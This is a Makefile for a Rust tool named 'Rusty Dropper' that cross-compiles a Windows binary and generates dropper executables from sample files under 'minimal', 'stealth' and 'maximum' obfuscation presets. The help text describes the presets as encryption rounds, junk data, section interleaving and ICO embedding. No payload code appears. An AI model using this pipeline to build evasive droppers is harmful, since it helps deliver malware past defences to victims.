# Rusty Dropper Makefile
# Cross-platform compilation and build automation

# Variables
TARGET_TRIPLE := x86_64-pc-windows-gnu
CARGO_TARGET_DIR := target
BUILD_DIR := $(CARGO_TARGET_DIR)/$(TARGET_TRIPLE)
DEBUG_EXE := $(BUILD_DIR)/debug/rusty-sheller.exe
RELEASE_EXE := $(BUILD_DIR)/release/rusty-sheller.exe
SAMPLES_DIR := samples
OUT_DIR := out
TEMP_DROP_DIR := temp_droppers

# Pipeline presets
PIPELINE_PRESETS := minimal stealth maximum

# Default target
.PHONY: all
all: build

# Help target
.PHONY: help
help:
	@echo "Rusty Dropper Build System"
	@echo "========================="
	@echo ""
	@echo "Available targets:"
	@echo "  build          - Build debug version (default)"
	@echo "  release        - Build release version"
	@echo "  clean          - Clean build artifacts"
	@echo "  droppers       - Create dropper executables with minimal obfuscation"
	@echo "  droppers-stealth - Create dropper executables with stealth obfuscation"
	@echo "  droppers-maximum - Create dropper executables with maximum obfuscation"
	@echo "  test           - Run tests"
	@echo "  check          - Check code without building"
	@echo "  fmt            - Format code"
	@echo "  clippy         - Run clippy linter"
	@echo "  help           - Show this help message"
	@echo ""
	@echo "Pipeline presets:"
	@echo "  minimal        - Basic encryption + ICO embedding"
	@echo "  stealth        - Pre-junk + section interleaving + encryption + post-junk + ICO"
	@echo "  maximum        - Multiple encryption rounds + extensive junk data + ICO"
	@echo ""
	@echo "Examples:"
	@echo "  make build                    # Build debug version"
	@echo "  make release                  # Build release version"
	@echo "  make droppers                 # Create minimal obfuscation droppers"
	@echo "  make droppers-stealth         # Create stealth obfuscation droppers"
	@echo "  make droppers-maximum         # Create maximum obfuscation droppers"

# Build debug version
.PHONY: build
build:
	@echo "Building debug version..."
	cargo build --target $(TARGET_TRIPLE)
	@echo "Debug build complete: $(DEBUG_EXE)"

# Build release version
.PHONY: release
release:
	@echo "Building release version..."
	cargo build --release --target $(TARGET_TRIPLE)
	@echo "Release build complete: $(RELEASE_EXE)"

# Process sample files (create individual dropper executables)
.PHONY: droppers
droppers:
	@echo "Creating dropper executables with minimal obfuscation..."
	@mkdir -p $(OUT_DIR)
	cargo run --bin build-droppers minimal $(SAMPLES_DIR) $(OUT_DIR)
	@echo "Dropper executables created in $(OUT_DIR)/"

# Create droppers with stealth obfuscation
.PHONY: droppers-stealth
droppers-stealth:
	@echo "Creating dropper executables with stealth obfuscation..."
	@mkdir -p $(OUT_DIR)
	cargo run --bin build-droppers stealth $(SAMPLES_DIR) $(OUT_DIR)
	@echo "Stealth dropper executables created in $(OUT_DIR)/"

# Create droppers with maximum obfuscation
.PHONY: droppers-maximum
droppers-maximum:
	@echo "Creating dropper executables with maximum obfuscation..."
	@mkdir -p $(OUT_DIR)
	cargo run --bin build-droppers maximum $(SAMPLES_DIR) $(OUT_DIR)
	@echo "Maximum obfuscation dropper executables created in $(OUT_DIR)/"

# Clean build artifacts
.PHONY: clean
clean:
	@echo "Cleaning build artifacts..."
	@echo "Running cargo clean..."
	cargo clean
	@echo "Removing output directories..."
	rm -rf $(OUT_DIR)
	rm -rf $(TEMP_DROP_DIR)
	@echo "Clean complete"

# Run tests
.PHONY: test
test:
	@echo "Running tests..."
	cargo test

# Check code without building
.PHONY: check
check:
	@echo "Checking code..."
	cargo check --target $(TARGET_TRIPLE)

# Format code
.PHONY: fmt
fmt:
	@echo "Formatting code..."
	cargo fmt

# Run clippy linter
.PHONY: clippy
clippy:
	@echo "Running clippy..."
	cargo clippy --target $(TARGET_TRIPLE)

# Development workflow
.PHONY: dev
dev: fmt clippy check test
	@echo "Development checks complete"

# Quick build for testing
.PHONY: quick
quick: check build
	@echo "Quick build complete"

# Show file sizes
.PHONY: size
size:
	@echo "File sizes:"
	@if [ -f "$(DEBUG_EXE)" ]; then \
		echo "Debug: $(DEBUG_EXE)"; \
		ls -lh $(DEBUG_EXE); \
	fi
	@if [ -f "$(RELEASE_EXE)" ]; then \
		echo "Release: $(RELEASE_EXE)"; \
		ls -lh $(RELEASE_EXE); \
	fi
	@if [ -d "$(OUT_DIR)" ]; then \
		echo "Generated droppers:"; \
		ls -lh $(OUT_DIR)/; \
	fi

# Verify build
.PHONY: verify
verify: build
	@echo "Verifying build..."
	@if [ -f "$(DEBUG_EXE)" ]; then \
		echo "✓ Debug executable exists"; \
		file $(DEBUG_EXE) || echo "file command not available"; \
	else \
		echo "✗ Debug executable not found"; \
		exit 1; \
	fi

# Cross-compilation info
.PHONY: info
info:
	@echo "Build Information:"
	@echo "=================="
	@echo "Target triple: $(TARGET_TRIPLE)"
	@echo "Build directory: $(BUILD_DIR)"
	@echo "Debug executable: $(DEBUG_EXE)"
	@echo "Release executable: $(RELEASE_EXE)"
	@echo "Samples directory: $(SAMPLES_DIR)"
	@echo "Output directory: $(OUT_DIR)"
	@echo ""
	@echo "Rust version:"
	@rustc --version
	@echo ""
	@echo "Cargo version:"
	@cargo --version
	@echo ""
	@echo "Installed targets:"
	@rustup target list --installed
